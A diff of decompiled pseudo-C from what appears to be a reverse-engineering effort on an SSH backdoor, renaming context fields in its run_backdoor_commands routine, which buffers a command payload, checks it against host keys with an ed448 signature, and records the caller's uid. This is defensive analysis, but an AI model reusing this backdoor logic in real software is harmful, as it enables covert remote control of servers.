@@ -132,8 +132,8 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
           libc = ctx->libc_imports;
           if (((libc != (libc_imports_t *)0x0) && (libc->getuid != (pfn_getuid_t)0x0)) &&
              ((libc->exit != (pfn_exit_t)0x0 &&
-              ((ctx->sshd_log_ctx != (sshd_log_ctx_t *)0x0 && (ctx->num_shifted_bits == 0x1c8))))))
-          {
+              ((ctx->sshd_log_ctx != (sshd_log_ctx_t *)0x0 && (ctx->secret_bits_filled == 0x1c8)))))
+             ) {
             local_83 = CONCAT44(uStack_2d7,CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25));
             lStack_7b = lStack_2d3;
             BVar16 = secret_data_get_decrypted((u8 *)&payload_size,ctx);
@@ -266,7 +266,7 @@ LAB_00109aa2:
                             }
                             uVar18 = (*ctx->libc_imports->getuid)();
                             bVar13 = local_2e0[0];
-                            ctx->uid = uVar18;
+                            ctx->caller_uid = uVar18;
                             bVar33 = local_2e0[0] & 0x10;
                             if (((bVar33 == 0) || (ctx->sshd_log_ctx->log_hooking_possible != FALSE)
                                 ) && (((local_2e0[0] & 2) == 0 ||
@@ -392,7 +392,7 @@ LAB_00109d36:
                                                           if ((uVar14 - 1 < 0x41) &&
                                                              (sVar22 = fd_read(iVar15,&
                                                   hostkey_hash_offset,1,libc), -1 < sVar22)) {
-                                                    ctx->sock_read_buf_size =
+                                                    ctx->sock_read_len =
                                                          (ulong)((int)tmp.field0_0x0 - 1);
                                                     sVar22 = fd_read(iVar15,ctx->sock_read_buf,
                                                                      (ulong)((int)tmp.field0_0x0 - 1
@@ -601,21 +601,21 @@ LAB_0010a1ba:
                             (uVar26 = (ulong)*(ushort *)(local_2e0 + uVar36 + lVar23 + 5) +
                                       lVar23 + 2U, uVar26 < cmd_type)) && (0x71 < cmd_type - uVar26)
                            ) {
-                          if (((ctx->current_data_size <= ctx->payload_data_size) &&
-                              (uVar20 = ctx->payload_data_size - ctx->current_data_size,
+                          if (((ctx->payload_bytes_buffered <= ctx->payload_buffer_size) &&
+                              (uVar20 = ctx->payload_buffer_size - ctx->payload_bytes_buffered,
                               0x38 < uVar20)) && (uVar26 <= uVar20 - 0x39)) {
-                            payload_cursor = ctx->payload_data;
+                            payload_cursor = ctx->payload_buffer;
                             uVar20 = 0;
                             do {
                               payload_cursor[uVar20] = local_2e0[uVar20 + uVar36 + 5];
                               uVar20 = uVar20 + 1;
                             } while (uVar26 != uVar20);
                             host_keys = ctx->sshd_sensitive_data->host_pubkeys;
-                            sshkey_digest_offset = ctx->current_data_size + uVar26;
-                            ctx->current_data_size = sshkey_digest_offset;
+                            sshkey_digest_offset = ctx->payload_bytes_buffered + uVar26;
+                            ctx->payload_bytes_buffered = sshkey_digest_offset;
                             BVar16 = verify_signature(host_keys[ctx->sshd_host_pubkey_idx],
-                                                      ctx->payload_data,sshkey_digest_offset,
-                                                      ctx->payload_data_size,
+                                                      ctx->payload_buffer,sshkey_digest_offset,
+                                                      ctx->payload_buffer_size,
                                                       auStack_2d9 + uVar26 + uVar36 + -2,
                                                       ed448_raw_key,ctx);
                             if (BVar16 != FALSE) goto LAB_00109a97;
